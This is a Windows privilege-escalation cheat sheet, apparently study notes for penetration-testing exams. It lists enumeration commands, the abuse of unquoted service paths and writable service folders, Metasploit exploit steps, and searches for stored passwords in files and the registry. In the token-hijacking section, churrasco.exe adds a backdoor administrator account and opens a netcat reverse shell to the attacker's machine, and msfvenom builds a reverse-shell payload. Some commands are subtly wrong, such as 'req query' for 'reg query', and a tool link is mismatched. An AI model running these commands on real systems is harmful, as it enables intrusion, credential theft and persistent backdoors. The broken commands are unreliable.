- [System information gathering](#Get_info)
- [Kernel exploits](#Kernel)
  - [Check Kernel version](#Check_verison)
- [Unquoted Service Paths](#Unquoted_service_paths)
  - [Check binary path name](#Check_binary_path_name)
  - [Unquoted service paths exploitaion](#Unquoted_service_paths_exploitaion)
- [Weak permissions](#weak_permissions)
  - [Folder permissions](#folder)
    - [Check folder permissions](#Check_folder_permissions)
    - [Folder permissions exploitation](#Folder_permissions_exploitation)
  - [Service permissions](#service)
  - [Registry permissions](#registry)
- [Antivirus](#Antivirus)
- [Metasploit](#Metasploit)
- [Hardcoded passwords](#Hardcoded_passwords)
  - [Search for password](#Search_for_password)
  - [Search passwords in files](#Passwords_in_files)
  - [Read registry for passwords](#Read_registry)
  - [Search password invregistry](#Search_in_registry)
- [DLL Hijacking](#Token_Hijacking)
- [Tools](#Tools)
  - [Powershell](#Powershell)
    - [Sherlock](#Sherlock)
    - [PowerUp](#PowerUp)
    - [Jaws-Enum](#jaws-enum)
  - [Executables](#Executables)
    - [winPEAS](#winPEAS)
    - [Seatbelt](#Seatbelt)
    - [Watson](#Watson)
  - [Other](#Others)
    - [Exploit Suggester(metasploit)](#exploit_suggester_metasploit)
    - [Exploit suggester (local)](#exploit_suggester__local)
------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Get_info

- systeminfo :***OS info***
- hostname :***host info***
- net users :***users info***
- net user <user_name>
- ipconfig /all :***network interfaces and routing table.***
- route print
- arp -A
- netstat -ano :***network connections and the firewall rules***
- netsh firewall show state
- netsh firewall show state
- netsh firewall show config
- schtasks /query /fo LIST /v :***scheduled tasks, running processes, started services and installed drivers.***
- tasklist /SVC
- net start


# Kernel

## Check_verison
```
systeminfo
``` 
## Windows kernel exploits resources:
- https://github.com/SecWiki/windows-kernel-exploits
------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Unquoted_service_paths

When a service is started Windows will search for the binary to execute. The location of the binary to be executed is declared in the binPath attribute. If the path to the binary is unquoted, Windows does not know where the binary is located and will search in all folders, from the beginning of the path.

So, if we want to exploit this misconfiguration, three conditions have to be met:
- The service path is unquoted;
- The service path contains space; and
- We have write permission in one of the intermediate folders.

### Check_binary_path_name
```
sc qc unquotedsvc
```
### Unquoted_service_paths_exploitaion

For **binPath** C:\Program Files\Unquoted Path Service\Common Files\service.exe

Windows will search in this order:
- C:\Program.exe
- C:\Program Files\Unquoted.exe
- C:\Program Files\Unquoted Path.exe
- C:\Program Files\Unquoted Path Service\Common.exe
- C:\Program Files\Unquoted Path Service\Common Files\service.exe

Store payload in the:
```
C:\Program Files\Unquoted Path Service\common.exe
```
Execute the payload by starting the service:
```
sc start unquotedsvc
```
------------------------------------------------------------------------------------------------------------------------------------------------------------------
# weak_permissions

## folder
If a user has write permission in a folder used by a service, he can replace the binary with a malicious one. When the service is restarted the malicious binary is executed with higher privileges.

### Check_folder_permissions
```
TO DO
```

### Folder_permissions_exploitation
```
copy /y C:\Users\user\Desktop\shell.exe "c:\Program Files\File Permissions Service\filepermservice.exe"

sc start filepermsvc
```
## service

------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Antivirus
 
### Check AV status
```
sc query windefend
```

### Check all services status
```
sc queryex type= service
```

### Check firewll status
```
netsh advfirewall firewall dump
```
```
netsh firewall show state
```
```
netsh firewall show config
```
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
## Metasploit

### local exploit suggester
```
meterpreter> run post/multi/recon/local_exploit_suggester
meterpreter> background
msf> use exploit/windows/local/ms10_015_kitrap0d (for example)
msf> options
msf> set session x
msf> set lhost
msf> set lport
msf> run
```
------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Hardcoded_passwords

## Search_for_password
```
find /si password *.txt
find /si password *.xml
find /si password *.ini
```
## Passwords_in_files
```
dir /s *pass* == *cred* == *vnc* == *config*
```
## Find passwords in all files
```
findstr /spin "password" *.*
```

## Read_in_files
```
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b
dir c:\ /s /b | findstr /si *vnc.ini
```
## Read_registry
```
VNC
  req query "HKCU\SOFTWARE\ORL\WinVNC3\Password"

Windows autologin
  req query "HKCU\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

SNMP Parameters
  req query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

Putty
  req query "HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions"
```
## Search_in_registry
```
req query HKLM /f password /t REG_SZ /s

req query HKCU /f password /t REG_SZ /s
```
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Token_Hijacking

## Privilage escalation for *nt authority\network service*
Network Service account is a special built-in account that has reduced privileges similar to an authenticated user account. This limited access helps safeguard the computer if an attacker compromises individual services or processes.
```
c:> whoami
whoami
nt authority\network service
```

## Check /priv
```
c:> whoami /priv
whoami /priv

check for SeImpersonatePrivilage is Enabled
```

## Upload *churrasco.exe*
- https://github.com/Re4son/Churrasco

## Create user *add user to localgroup Administrator*
```
churrasco.bin "net user oscp oscp /add && net localgroup Administrators oscp /add"
```

## Create connection *nc connection*
```
churrasco.exe "nc.exe <your_machine_ip> <your_machine_port> -e cmd.exe"
```

## Create reverse shell
```
msfvenom -p windows/shell_reverse_tcp lhost=<your_ip_address> lport=<your_port> -f exe -o revshell.exe
upload revshell.exe to machine

churrasco.exe -d "C:\revshell\exe\path\"

in your machine nc -lnvp xyz
```
----------------------------------------------------------------------------------------------------------------------------------------------------------------
# Tools

## PowerShell

### Sherlock
  - https://github.com/sherlock-project/sherlock

### PowerUp
  - https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp

### jaws-enum
  - https://github.com/411Hall/JAWS

## Executables

### winPEAS
  - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS

### Seatbelt
  - https://github.com/GhostPack/Seatbelt

### Watson
  - https://github.com/rasta-mouse/Watson

### SharpUp
  - 
  
## Others

### exploit_suggester_metasploit

### exploit_suggester__local
